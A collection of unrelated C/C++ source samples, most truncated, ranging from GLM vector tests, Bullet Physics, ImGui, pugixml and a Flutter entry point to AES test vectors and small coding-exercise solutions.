1;\n#\tendif\n\n#if GLM_HAS_INITIALIZER_LISTS\n\t{\n\t\tglm::vec4 a{ 0, 1, 2, 3 };\n\t\tstd::vector<glm::vec4> v = {\n\t\t\t{0, 1, 2, 3},\n\t\t\t{4, 5, 6, 7},\n\t\t\t{8, 9, 0, 1}};\n\t}\n\n\t{\n\t\tglm::dvec4 a{ 0, 1, 2, 3 };\n\t\tstd::vector<glm::dvec4> v = {\n\t\t\t{0, 1, 2, 3},\n\t\t\t{4, 5, 6, 7},\n\t\t\t{8, 9, 0, 1}};\n\t}\n#endif\n\n#\tif GLM_CONFIG_SWIZZLE == GLM_SWIZZLE_OPERATOR\n\t{\n\t\tglm::ivec4 A = glm::vec4(1.0f, 2.0f, 3.0f, 4.0f);\n\t\tglm::ivec4 B = A.xyzw;\n\t\tglm::ivec4 C(A.xyzw);\n\t\tglm::ivec4 D(A.xyzw());\n\t\tglm::ivec4 E(A.x, A.yzw);\n\t\tglm::ivec4 F(A.x, A.yzw());\n\t\tglm::ivec4 G(A.xyz, A.w);\n\t\tglm::ivec4 H(A.xyz(), A.w);\n\t\tglm::ivec4 I(A.xy, A.zw);\n\t\tglm::ivec4 J(A.xy(), A.zw());\n\t\tglm::ivec4 K(A.x, A.y, A.zw);\n\t\tglm::ivec4 L(A.x, A.yz, A.w);\n\t\tglm::ivec4 M(A.xy, A.z, A.w);\n\n\t\tError += glm::all(glm::equal(A, B)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, C)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, D)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, E)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, F)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, G)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, H)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, I)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, J)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, K)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, L)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, M)) ? 0 : 1;\n\t}\n#\tendif\n\n#\tif GLM_CONFIG_SWIZZLE\n\t{\n\t\tglm::ivec4 A = glm::vec4(1.0f, 2.0f, 3.0f, 4.0f);\n\t\tglm::ivec4 B = A.xyzw();\n\t\tglm::ivec4 C(A.xyzw());\n\t\tglm::ivec4 D(A.xyzw());\n\t\tglm::ivec4 E(A.x, A.yzw());\n\t\tglm::ivec4 F(A.x, A.yzw());\n\t\tglm::ivec4 G(A.xyz(), A.w);\n\t\tglm::ivec4 H(A.xyz(), A.w);\n\t\tglm::ivec4 I(A.xy(), A.zw());\n\t\tglm::ivec4 J(A.xy(), A.zw());\n\t\tglm::ivec4 K(A.x, A.y, A.zw());\n\t\tglm::ivec4 L(A.x, A.yz(), A.w);\n\t\tglm::ivec4 M(A.xy(), A.z, A.w);\n\n\t\tError += glm::all(glm::equal(A, B)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, C)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, D)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, E)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, F)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, G)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, H)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, I)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, J)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, K)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, L)) ? 0 : 1;\n\t\tError += glm::all(glm::equal(A, M)) ? 0 : 1;\n\t}\n#\tendif//GLM_CONFIG_SWIZZLE\n\n\t{\n\t\tglm::ivec4 A(1);\n\t\tglm::ivec4 B(1, 1, 1, 1);\n\t\t\n\t\tError += A == B ? 0 : 1;\n\t}\n\t\n\t{\n\t\tstd::vector<glm::ivec4> Tests;\n\t\tTests.push_back(glm::ivec4(glm::ivec2(1, 2), 3, 4));\n\t\tTests.push_back(glm::ivec4(1, glm::ivec2(2, 3), 4));\n\t\tTests.push_back(glm::ivec4(1, 2, glm::ivec2(3, 4)));\n\t\tTests.push_back(glm::ivec4(glm::ivec3(1, 2, 3), 4));\n\t\tTests.push_back(glm::ivec4(1, glm::ivec3(2, 3, 4)));\n\t\tTests.push_back(glm::ivec4(glm::ivec2(1, 2), glm::ivec2(3, 4)));\n\t\tTests.push_back(glm::ivec4(1, 2, 3, 4));\n\t\tTests.push_back(glm::ivec4(glm::ivec4(1, 2, 3, 4)));\n\t\t\n\t\tfor(std::size_t i = 0; i < Tests.size(); ++i)\n\t\t\tError += Tests[i] == glm::ivec4(1, 2, 3, 4) ? 0 : 1;\n\t}\n\t\n\treturn Error;\n}\n\nstatic int test_bvec4_ctor()\n{\n\tint Error = 0;\n\n\tglm::bvec4 const A(true);\n\tglm::bvec4 const B(true);\n\tglm::bvec4 const C(false);\n\tglm::bvec4 const D = A && B;\n\tglm::bvec4 const E = A && C;\n\tglm::bvec4 const F = A || C;\n\n\tError += D == glm::bvec4(true) ? 0 : 1;\n\tError += E == glm::bvec4(false) ? 0 : 1;\n\tError += F == glm::bvec4(true) ? 0 : 1;\n\n\tbool const G = A == C;\n\tbool const H = A != C;\n\n\tError += !G ? 0 : 1;\n\tError += H ? 0 : 1;\n\n\treturn Error;\n}\n\nstatic int test_vec4_operators()\n{\n\tint Error = 0;\n\t\n\t{\n\t\tglm::ivec4 A(1);\n\t\tglm::ivec4 B(1);\n\t\tbool R = A != B;\n\t\tbool S = A == B;\n\n\t\tError += (S && !R) ? 0 : 1;\n\t}\n\n\t{\n\t\tglm::vec4 const A(1.0f, 2.0f, 3.0f, 4.0f);\n\t\tglm::vec4 const B(4.0f, 5.0f, 6.0f, 7.0f);\n\n\t\tglm::vec4 const C = A + B;\n\t\tError += glm::all(glm::equal(C, glm::vec4(5, 7, 9, 11), 0.001f)) ? 0 : 1;\n\n\t\tglm::vec4 D = B - A;\n\t\tError += glm::all(glm::equal(D, glm::vec4(3, 3, 3, 3), 0.001f)) ? 0 : 1;\n\n\t\tglm::vec4 E = A * B;\n\t\tError += glm::all(glm:",
    "/*\nBullet Continuous Collision Detection and Physics Library\nCopyright (c) 2003-2009 Erwin Coumans  http://bulletphysics.org\n\nThis software is provided 'as-is', without any express or implied warranty.\nIn no event will the authors be held liable for any damages arising from the use of this software.\nPermission is granted to anyone to use this software for any purpose, \nincluding commercial applications, and to alter it and redistribute it freely, \nsubject to the following restrictions:\n\n1. The origin of this software must not be misrepresented; you must not claim that you wrote the original software. If you use this software in a product, an acknowledgment in the product documentation would be appreciated but is not required.\n2. Altered source versions must be plainly marked as such, and must not be misrepresented as being the original software.\n3. This notice may not be removed or altered from any source distribution.\n*/\n\n#include \"btConvexHullShape.h\"\n#include \"BulletCollision/CollisionShapes/btCollisionMargin.h\"\n\n#include \"LinearMath/btQuaternion.h\"\n#include \"LinearMath/btSerializer.h\"\n\nbtConvexHullShape ::btConvexHullShape (const btScalar* points,int numPoints,int stride) : btPolyhedralConvexAabbCachingShape ()\n{\n\tm_shapeType = CONVEX_HULL_SHAPE_PROXYTYPE;\n\tm_unscaledPoints.resize(numPoints);\n\n\tunsigned char* pointsAddress = (unsigned char*)points;\n\n\tfor (int i=0;i<numPoints;i++)\n\t{\n\t\tbtScalar* point = (btScalar*)pointsAddress;\n\t\tm_unscaledPoints[i] = btVector3(point[0], point[1], point[2]);\n\t\tpointsAddress += stride;\n\t}\n\n\trecalcLocalAabb();\n\n}\n\n\n\nvoid btConvexHullShape::setLocalScaling(const btVector3& scaling)\n{\n\tm_localScaling = scaling;\n\trecalcLocalAabb();\n}\n\nvoid btConvexHullShape::addPoint(const btVector3& point)\n{\n\tm_unscaledPoints.push_back(point);\n\trecalcLocalAabb();\n\n}\n\nbtVector3\tbtConvexHullShape::localGetSupportingVertexWithoutMargin(const btVector3& vec)const\n{\n\tbtVector3 supVec(btScalar(0.),btScalar(0.),btScalar(0.));\n\tbtScalar maxDot = btScalar(-BT_LARGE_FLOAT);\n\n    // Here we take advantage of dot(a, b*c) = dot(a*b, c).  Note: This is true mathematically, but not numerically. \n    if( 0 < m_unscaledPoints.size() )\n    {\n        btVector3 scaled = vec * m_localScaling;\n        int index = (int) scaled.maxDot( &m_unscaledPoints[0], m_unscaledPoints.size(), maxDot); // FIXME: may violate encapsulation of m_unscaledPoints\n        return m_unscaledPoints[index] * m_localScaling;\n    }\n\n    return supVec;\n}\n\nvoid\tbtConvexHullShape::batchedUnitVectorGetSupportingVertexWithoutMargin(const btVector3* vectors,btVector3* supportVerticesOut,int numVectors) const\n{\n\tbtScalar newDot;\n\t//use 'w' component of supportVerticesOut?\n\t{\n\t\tfor (int i=0;i<numVectors;i++)\n\t\t{\n\t\t\tsupportVerticesOut[i][3] = btScalar(-BT_LARGE_FLOAT);\n\t\t}\n\t}\n\n    for (int j=0;j<numVectors;j++)\n    {\n        btVector3 vec = vectors[j] * m_localScaling;        // dot(a*b,c) = dot(a,b*c)\n        if( 0 <  m_unscaledPoints.size() )\n        {\n            int i = (int) vec.maxDot( &m_unscaledPoints[0], m_unscaledPoints.size(), newDot);\n            supportVerticesOut[j] = getScaledPoint(i);\n            supportVerticesOut[j][3] = newDot;        \n        }\n        else\n            supportVerticesOut[j][3] = -BT_LARGE_FLOAT;\n    }\n\n\n\n}\n\t\n\n\nbtVector3\tbtConvexHullShape::localGetSupportingVertex(const btVector3& vec)const\n{\n\tbtVector3 supVertex = localGetSupportingVertexWithoutMargin(vec);\n\n\tif ( getMargin()!=btScalar(0.) )\n\t{\n\t\tbtVector3 vecnorm = vec;\n\t\tif (vecnorm .length2() < (SIMD_EPSILON*SIMD_EPSILON))\n\t\t{\n\t\t\tvecnorm.setValue(btScalar(-1.),btScalar(-1.),btScalar(-1.));\n\t\t} \n\t\tvecnorm.normalize();\n\t\tsupVertex+= getMargin() * vecnorm;\n\t}\n\treturn supVertex;\n}\n\n\n\n\n\n\n\n\n\n//currently just for debugging (drawing), perhaps future support for algebraic continuous collision detection\n//Please note that you can debug-draw btConvexHullShape with the Raytracer Demo\nint\tbtConvexHullShape::getNumVertices() const\n{\n\treturn m_unscaledPoints.size();\n}\n\nint btConvexHullShape::getNumEdges() const\n{\n\treturn m_unscaledPoints.size();\n}\n\nvoid btConvexHullShape::getEdge(int i,btVector3& pa,btVector3& pb) const\n{\n\n\tint index0 = i%m_unscaledPoints.size();\n\tint index1 = (i+1)%m_unscaledPoints.size();\n\tpa = getScaledPoint(index0);\n\tpb = getScaledPoint(index1);\n}\n\nvoid btConvexHullShape::getVertex(int i,btVector3& vtx) const\n{\n\tvtx = getScaledPoint(i);\n}\n\nint\tbtConvexHullShape::getNumPlanes() const\n{\n\treturn 0;\n}\n\nvoid btConvexHullShape::getPlane(btVector3& ,btVector3& ,int ) const\n{\n\n\tbtAssert(0);\n}\n\n//not yet\nbool btConvexHullShape::isInside(const btVector3& ,btScalar ) const\n{\n\tbtAssert(0);\n\treturn false;\n}\n\n///fills the dataBuffer and returns the struct name (and 0 on failure)\nconst char*\tbtConvexHullShape::serialize(void* dataBuffer, btSerializer* serializer) const\n{\n\t//int szc = sizeof(btConvexHullShapeData);\n\tbtConvexHullShapeData* shapeData = (btConvexHullShapeData*) dataBuffer;\n\tbtConvexInternalShape::serialize(&shapeData->m_convexInternalShapeData, serialize",
    "#include \"testdata.h\"\n\nTestVector const testVectorAES128 = {\n    .name = \"AES-128-ECB\",\n    .key = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,\n            0x0B, 0x0C, 0x0D, 0x0E, 0x0F},\n    .plaintext = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,\n                  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},\n    .ciphertext = {0x69, 0xC4, 0xE0, 0xD8, 0x6A, 0x7B, 0x04, 0x30, 0xD8, 0xCD,\n                   0xB7, 0x80, 0x70, 0xB4, 0xC5, 0x5A}};\nTestVector const testVectorAES192 = {\n    .name = \"AES-192-ECB\",\n    .key = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,\n            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,\n            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17},\n    .plaintext = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,\n                  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},\n    .ciphertext = {0xDD, 0xA9, 0x7C, 0xA4, 0x86, 0x4C, 0xDF, 0xE0, 0x6E, 0xAF,\n                   0x70, 0xA0, 0xEC, 0x0D, 0x71, 0x91}};\nTestVector const testVectorAES256 = {\n    .name = \"AES-256-ECB\",\n    .key = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,\n            0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,\n            0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F},\n    .plaintext = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99,\n                  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},\n    .ciphertext = {0x8E, 0xA2, 0xB7, 0xCA, 0x51, 0x67, 0x45, 0xBF, 0xEA, 0xFC,\n                   0x49, 0x90, 0x4B, 0x49, 0x60, 0x89}};\n",
    "class Solution {\r\npublic:\r\n    string longestDiverseString(int a, int b, int c) {\r\n        string ans;\r\n        priority_queue<pair<int, char>> pq;\r\n        \r\n        // Push counts and characters into priority queue if they are greater than 0\r\n        if (a > 0) {\r\n            pq.push({a, 'a'});\r\n        }\r\n        if (b > 0) {\r\n            pq.push({b, 'b'});\r\n        }\r\n        if (c > 0) {\r\n            pq.push({c, 'c'});\r\n        }\r\n\r\n        while (!pq.empty()) {\r\n            auto [curr_cnt, curr_char] = pq.top();\r\n            pq.pop();\r\n            \r\n            // Check if the last two characters in the string are the same as the current character\r\n            if (ans.size() >= 2 && ans[ans.size() - 1] == curr_char && ans[ans.size() - 2] == curr_char) {\r\n                if (pq.empty()) {\r\n                    // If no other character is available, return the current answer\r\n                    return ans;\r\n                }\r\n                // Use the next most frequent character\r\n                auto [next_cnt, next_char] = pq.top();\r\n                pq.pop();\r\n                ans.push_back(next_char);\r\n                next_cnt--;\r\n                \r\n                if (next_cnt > 0) {\r\n                    pq.push({next_cnt, next_char});\r\n                }\r\n                pq.push({curr_cnt, curr_char});  // Push the current character back\r\n            } else {\r\n                ans.push_back(curr_char);\r\n                curr_cnt--;\r\n                \r\n                if (curr_cnt > 0) {\r\n                    pq.push({curr_cnt, curr_char});\r\n                }\r\n            }\r\n        }\r\n        return ans;\r\n    }\r\n};\r\n",
    "// dear imgui: Renderer Backend for DirectX11\n// This needs to be used along with a Platform Backend (e.g. Win32)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'ID3D11ShaderResourceView*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-05-19: DirectX11: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-02-18: DirectX11: Change blending equation to preserve alpha in output buffer.\n//  2019-08-01: DirectX11: Fixed code querying the Geometry Shader state (would generally error with Debug layer enabled).\n//  2019-07-21: DirectX11: Backup, clear and restore Geometry Shader is any is bound when calling ImGui_ImplDX10_RenderDrawData. Clearing Hull/Domain/Compute shaders without backup/restore.\n//  2019-05-29: DirectX11: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2019-04-30: DirectX11: Added support for special ImDrawCallback_ResetRenderState callback to reset render state.\n//  2018-12-03: Misc: Added #pragma comment statement to automatically link with d3dcompiler.lib when using D3DCompile().\n//  2018-11-30: Misc: Setting up io.BackendRendererName so it can be displayed in the About Window.\n//  2018-08-01: DirectX11: Querying for IDXGIFactory instead of IDXGIFactory1 to increase compatibility.\n//  2018-07-13: DirectX11: Fixed unreleased resources in Init and Shutdown functions.\n//  2018-06-08: Misc: Extracted imgui_impl_dx11.cpp/.h away from the old combined DX11+Win32 example.\n//  2018-06-08: DirectX11: Use draw_data->DisplayPos and draw_data->DisplaySize to setup projection matrix and clipping rectangle.\n//  2018-02-16: Misc: Obsoleted the io.RenderDrawListsFn callback and exposed ImGui_ImplDX11_RenderDrawData() in the .h file so you can call it yourself.\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2016-05-07: DirectX11: Disabling depth-write.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_dx11.h\"\n\n// DirectX\n#include <stdio.h>\n#include <d3d11.h>\n#include <d3dcompiler.h>\n#ifdef _MSC_VER\n#pragma comment(lib, \"d3dcompiler\") // Automatically link with d3dcompiler.lib as we are using D3DCompile() below.\n#endif\n\n// DirectX11 data\nstruct ImGui_ImplDX11_Data\n{\n    ID3D11Device*               pd3dDevice;\n    ID3D11DeviceContext*        pd3dDeviceContext;\n    IDXGIFactory*               pFactory;\n    ID3D11Buffer*               pVB;\n    ID3D11Buffer*               pIB;\n    ID3D11VertexShader*         pVertexShader;\n    ID3D11InputLayout*          pInputLayout;\n    ID3D11Buffer*               pVertexConstantBuffer;\n    ID3D11PixelShader*          pPixelShader;\n    ID3D11SamplerState*         pFontSampler;\n    ID3D11ShaderResourceView*   pFontTextureView;\n    ID3D11RasterizerState*      pRasterizerState;\n    ID3D11BlendState*           pBlendState;\n    ID3D11DepthStencilState*    pDepthStencilState;\n    int                         VertexBufferSize;\n    int                         IndexBufferSize;\n\n    ImGui_ImplDX11_Data()       { memset((void*)this, 0, sizeof(*this)); VertexBufferSize = 5000; IndexBufferSize = 10000; }\n};\n\nstruct VERTEX_CONSTANT_BUFFER_DX11\n{\n    float   mvp[4][4];\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplDX11_Data* ImGui_ImplDX11_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplDX11_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nstatic void ImGui_ImplDX11_SetupRenderState(ImDrawData* draw_data, ID3D11DeviceContext* ctx)\n{\n    ImGui_ImplDX11_Data* bd = ImGui_ImplDX11_GetBackendData();\n\n    // Setup viewport\n    D3D11_VIEWPORT vp;\n    memset(&vp, 0, sizeof(D3D11_VIEWPORT));\n    vp.Width = draw_dat",
    "/**\n * pugixml parser - version 1.14\n * --------------------------------------------------------\n * Copyright (C) 2006-2024, by Arseny Kapoulkine (arseny.kapoulkine@gmail.com)\n * Report bugs and download new versions at https://pugixml.org/\n *\n * This library is distributed under the MIT License. See notice at the end\n * of this file.\n *\n * This work is based on the pugxml parser, which is:\n * Copyright (C) 2003, by Kristen Wegner (kristen@tima.net)\n */\n\n#ifndef SOURCE_PUGIXML_CPP\n#define SOURCE_PUGIXML_CPP\n\n#include \"pugixml.hpp\"\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <assert.h>\n#include <limits.h>\n\n#ifdef PUGIXML_WCHAR_MODE\n#\tinclude <wchar.h>\n#endif\n\n#ifndef PUGIXML_NO_XPATH\n#\tinclude <math.h>\n#\tinclude <float.h>\n#endif\n\n#ifndef PUGIXML_NO_STL\n#\tinclude <istream>\n#\tinclude <ostream>\n#\tinclude <string>\n#endif\n\n// For placement new\n#include <new>\n\n// For load_file\n#if defined(__linux__) || defined(__APPLE__)\n#include <sys/stat.h>\n#endif\n\n#ifdef _MSC_VER\n#\tpragma warning(push)\n#\tpragma warning(disable: 4127) // conditional expression is constant\n#\tpragma warning(disable: 4324) // structure was padded due to __declspec(align())\n#\tpragma warning(disable: 4702) // unreachable code\n#\tpragma warning(disable: 4996) // this function or variable may be unsafe\n#endif\n\n#if defined(__clang__)\n#\tpragma clang diagnostic push\n#\tpragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\" // NULL as null pointer constant\n#endif\n\n#if defined(_MSC_VER) && defined(__c2__)\n#\tpragma clang diagnostic push\n#\tpragma clang diagnostic ignored \"-Wdeprecated\" // this function or variable may be unsafe\n#endif\n\n#ifdef __INTEL_COMPILER\n#\tpragma warning(disable: 177) // function was declared but never referenced\n#\tpragma warning(disable: 279) // controlling expression is constant\n#\tpragma warning(disable: 1478 1786) // function was declared \"deprecated\"\n#\tpragma warning(disable: 1684) // conversion from pointer to same-sized integral type\n#endif\n\n#if defined(__BORLANDC__) && defined(PUGIXML_HEADER_ONLY)\n#\tpragma warn -8080 // symbol is declared but never used; disabling this inside push/pop bracket does not make the warning go away\n#endif\n\n#ifdef __BORLANDC__\n#\tpragma option push\n#\tpragma warn -8008 // condition is always false\n#\tpragma warn -8066 // unreachable code\n#endif\n\n#ifdef __SNC__\n// Using diag_push/diag_pop does not disable the warnings inside templates due to a compiler bug\n#\tpragma diag_suppress=178 // function was declared but never referenced\n#\tpragma diag_suppress=237 // controlling expression is constant\n#endif\n\n#ifdef __TI_COMPILER_VERSION__\n#\tpragma diag_suppress 179 // function was declared but never referenced\n#endif\n\n// Inlining controls\n#if defined(_MSC_VER) && _MSC_VER >= 1300\n#\tdefine PUGI_IMPL_NO_INLINE __declspec(noinline)\n#elif defined(__GNUC__)\n#\tdefine PUGI_IMPL_NO_INLINE __attribute__((noinline))\n#else\n#\tdefine PUGI_IMPL_NO_INLINE\n#endif\n\n// Branch weight controls\n#if defined(__GNUC__) && !defined(__c2__)\n#\tdefine PUGI_IMPL_UNLIKELY(cond) __builtin_expect(cond, 0)\n#else\n#\tdefine PUGI_IMPL_UNLIKELY(cond) (cond)\n#endif\n\n// Simple static assertion\n#define PUGI_IMPL_STATIC_ASSERT(cond) { static const char condition_failed[(cond) ? 1 : -1] = {0}; (void)condition_failed[0]; }\n\n// Digital Mars C++ bug workaround for passing char loaded from memory via stack\n#ifdef __DMC__\n#\tdefine PUGI_IMPL_DMC_VOLATILE volatile\n#else\n#\tdefine PUGI_IMPL_DMC_VOLATILE\n#endif\n\n// Integer sanitizer workaround; we only apply this for clang since gcc8 has no_sanitize but not unsigned-integer-overflow and produces \"attribute directive ignored\" warnings\n#if defined(__clang__) && defined(__has_attribute)\n#\tif __has_attribute(no_sanitize)\n#\t\tdefine PUGI_IMPL_UNSIGNED_OVERFLOW __attribute__((no_sanitize(\"unsigned-integer-overflow\")))\n#\telse\n#\t\tdefine PUGI_IMPL_UNSIGNED_OVERFLOW\n#\tendif\n#else\n#\tdefine PUGI_IMPL_UNSIGNED_OVERFLOW\n#endif\n\n// Borland C++ bug workaround for not defining ::memcpy depending on header include order (can't always use std::memcpy because some compilers don't have it at all)\n#if defined(__BORLANDC__) && !defined(__MEM_H_USING_LIST)\nusing std::memcpy;\nusing std::memmove;\nusing std::memset;\n#endif\n\n// Old versions of GCC do not define ::malloc and ::free depending on header include order\n#if defined(__GNUC__) && (__GNUC__ < 3 || (__GNUC__ == 3 && __GNUC_MINOR__ < 4))\nusing std::malloc;\nusing std::free;\n#endif\n\n// Some MinGW/GCC versions have headers that erroneously omit LLONG_MIN/LLONG_MAX/ULLONG_MAX definitions from limits.h in some configurations\n#if defined(PUGIXML_HAS_LONG_LONG) && defined(__GNUC__) && !defined(LLONG_MAX) && !defined(LLONG_MIN) && !defined(ULLONG_MAX)\n#\tdefine LLONG_MIN (-LLONG_MAX - 1LL)\n#\tdefine LLONG_MAX __LONG_LONG_MAX__\n#\tdefine ULLONG_MAX (LLONG_MAX * 2ULL + 1ULL)\n#endif\n\n// In some environments MSVC is a compiler but the CRT lacks certain MSVC-specific features\n#if defined(_MSC_VER) && !defined(__S3E__) && !defined(_WIN32_WCE)\n#\tdefine PUGI_IMPL_MSVC_CRT_VERS",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"my_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<bits/stdtr1c++.h>\r\nusing namespace std;\r\n\r\nclass Solution {\r\npublic:\r\n    vector<int> intersection(vector<int>& nums1, vector<int>& nums2) {\r\n        unordered_map<int,int>ans1;\r\n        unordered_map<int,int>ans2;\r\n        vector<int>result;\r\n        for(int i=0;i<nums1.size();i++)\r\n        {\r\n            ans1[nums1[i]]++;\r\n        }\r\n         for(int i=0;i<nums2.size();i++)\r\n        {\r\n            ans2[nums2[i]]++;\r\n        }\r\n         for (auto it : ans1) {\r\n            \r\n            if (ans2.find(it.first) != ans2.end()) {\r\n                result.push_back(it.first); \r\n            }\r\n        }\r\n        \r\n        return result;\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n    Solution obj;\r\n    int t;\r\n    cout<<\"enter the test cases\";\r\n    cin>>t;\r\n    while(t--)\r\n    {\r\n        int n, m;\r\n        cout << \"Enter the size of array 1: \";\r\n        cin >> n;\r\n        cout << \"Enter the size of array 2: \";\r\n        cin >> m;\r\n\r\n        vector<int> nums1(n);\r\n        vector<int> nums2(m);\r\n\r\n        cout << \"Enter array 1 elements: \";\r\n        for(int i = 0; i < n; i++)\r\n        {\r\n            cin >> nums1[i];\r\n        }\r\n\r\n        cout << \"Enter array 2 elements: \";\r\n        for(int i = 0; i < m; i++)\r\n        {\r\n            cin >> nums2[i];\r\n        }\r\n\r\n        vector<int> result = obj.intersection(nums1,nums2);\r\n\r\n        cout << \"Intersection Array: \";\r\n        for (int i = 0; i < result.size(); i++) {\r\n            cout << result[i] << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "\ufeff// step_1\n#include <iostream>\nusing namespace std;\nint main()\n{\n    // \u0434\u0435\u043c\u043e\u043d\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u0440\u0430\u0437\u043b\u0438\u0447\u0438\u044f \u043c\u0435\u0436\u0434\u0443 \u0446\u0435\u043b\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438 \n    // \u0441\u043e \u0437\u043d\u0430\u043a\u043e\u043c \u0438 \u0431\u0435\u0441 \u0437\u043d\u0430\u043a\u0430\n    short int i;            // \u043a\u043e\u0440\u043e\u0442\u043a\u043e\u0435 \u0446\u0435\u043b\u043e\u0435 \u0441\u043e \u0437\u043d\u0430\u043a\u043e\u043c\n    short unsigned int j;  // \u043a\u043e\u0440\u043e\u0442\u043a\u043e\u0435 \u0446\u0435\u043b\u043e\u0435 \u0431\u0435\u0437 \u0437\u043d\u0430\u043a\u0430\n\n    j = 60000;  //60000 \u043d\u0430\u0445\u043e\u0434\u0438\u0442\u0441\u044f \u0432 \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0438 \u0434\u043b\u044f unsignet short int \u043d\u043e \u043a\u0430\u043a \u043f\u0440\u0430\u0432\u0438\u043b\u043e \u0431\u0443\u0434\u0435\u0442\n    i = j;     //\u0432\u043d\u0435 \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e\u0433\u043e \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d \u0434\u043b\u0447 \u0447\u0438\u0441\u043b\u0430 signed short int \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0435 